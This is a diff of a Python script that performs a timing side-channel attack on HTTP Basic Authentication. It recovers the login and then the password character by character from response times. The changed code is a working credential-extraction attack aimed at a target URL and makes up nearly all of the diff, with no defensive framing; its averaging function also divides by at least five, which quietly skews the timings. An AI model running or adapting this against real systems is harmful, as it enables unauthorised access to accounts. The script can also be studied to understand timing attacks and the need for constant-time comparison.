@@ -12,22 +12,27 @@ from requests.auth import HTTPBasicAuth
 from operator import itemgetter
 
 
-def run_test(payload, url):
+def mean(numbers):
+    return float(sum(numbers)) / max(len(numbers), 5)
+
+
+def run_test(login, password, url):
     """
     Records timing data for an individual time attack event
     :param payload: the password string to be tested
     :param url: the target website
     :return: the time in float to complete the attack event
     """
-    total_time = 0
-    while total_time <= 0:  # error checking to prevent timing errors
+    tests = []
+    while len(tests) < 3:
         pre_time = time.time()
-        requests.get(url, auth=HTTPBasicAuth('hacker', payload))
+        requests.get(url, auth=HTTPBasicAuth(login, password))
         total_time = time.time() - pre_time
-    return total_time
+        tests.append(total_time)
+    return mean(tests)
 
 
-def range_testing(poss_chars, known_login, known_pass, url):
+def range_testing(poss_chars, known_login, known_pass, url, login_found):
     """
     Builds a list of test results and sorts from the longest duration
     to shortest over a range of provided characters
@@ -38,19 +43,25 @@ def range_testing(poss_chars, known_login, known_pass, url):
     """
     test_list = []
     for test_char in poss_chars:
-        load = known_pass + test_char
-        print("The current test is %s" % load)
-        total_time = run_test(load, url)
-        print("Time for %s was %f" % (load, total_time))
+        if login_found:  # Login is already found
+            test = known_pass + test_char
+            print("The current test is %s" % test)
+            total_time = run_test(known_login, test, url)
+            print("Time for %s was %f" % (test, total_time))
+        else:
+            test = known_login + test_char
+            print("The current test is %s" % test)
+            total_time = run_test(test, '', url)
+            print("Time for %s was %f" % (test, total_time))
         test_list.append((total_time, test_char))
     test_list.sort(key=itemgetter(0), reverse=True)  # sorting the list
     result_list = []
-    for pass_char in test_list[:10]:
+    for pass_char in test_list[:5]:
         result_list.append(pass_char[1])
     return result_list
 
 
-def check_char(known_login, known_pass, url):
+def find_pass(login, known_pass, url):
     """
     Organizes the test of all alphanumeric characters and then runs a test
     of the top ten results from the 1st test to provide error checking
@@ -63,20 +74,30 @@ def check_char(known_login, known_pass, url):
     :return: the list of known characters with a new correct character
     attached.
     """
-    if known_login:
-        test_login = known_login  # test_load the test string for comparison
-    else:
-        test_login = ""
-    if known_pass:
-        test_pass = known_pass  # test_load the test string for comparison
-    else:
-        test_pass = ""
     sample_range = string.ascii_letters + string.digits  # building range of all alphanumeric
-    top_ten = range_testing(sample_range, test_login, test_pass, url)
-    print("Testing the top 10 results")
-    final_test = range_testing(top_ten, test_login, test_pass, url)
-    print("The slowest character was %s" % final_test[0])
+    print('\n\nTesting login %s and pass %s' % (login, known_pass))
+    top_five = range_testing(sample_range, login, known_pass, url, True)
+    print("\n\nTesting the top 5 results")
+    final_test = range_testing(top_five, login, known_pass, url, True)
+    print("\n\nThe slowest character was %s" % final_test[0])
     return known_pass + final_test[0]
+
+
+def find_login(url):
+    test_login = ''
+    end_found = False
+    sample_range = ':' + string.ascii_letters + string.digits
+    while not end_found:
+        print('\n\nTesting login %s' % test_login)
+        top_five = range_testing(sample_range, test_login, None, url, False)
+        print("\n\nTesting the top 5 results")
+        final_test = range_testing(top_five, test_login, None, url, False)
+        if final_test[0] == ':':
+            end_found = True
+        else:
+            test_login = test_login + final_test[0]
+        print("\n\nThe slowest character was %s" % final_test[0])
+    return test_login
 
 
 def main():
@@ -91,14 +112,15 @@ def main():
     url_status = requests.get(test_url)  # validate the url
     if url_status.status_code != 401:
         print("URL in error or without authentication with status code %d" % url_status)
+        sys.exit(1)
 
     # Beginning the actual attack
-    known_login = "" # This is holder of the username as it is being built
-    known_pass = ""  # This is holder of the password as it is being built
-    while requests.get(test_url, auth=HTTPBasicAuth(known_login, known_pass)).status_code == 401:
-        known_pass = check_char(known_login, known_pass, test_url)
-
-    print("\n\nFinished! \n The password is %s" % known_pass)
+    login = find_login(test_url)
+    print("\n\nThe login is %s" % login)
+    pwd = ''
+    while requests.get(test_url, auth=HTTPBasicAuth(login, pwd)).status_code == 401:
+        pwd = find_pass(login, pwd, test_url)
+    print("\n\nFinished! \n The password is %s" % pwd)
 
 
 if __name__ == '__main__':
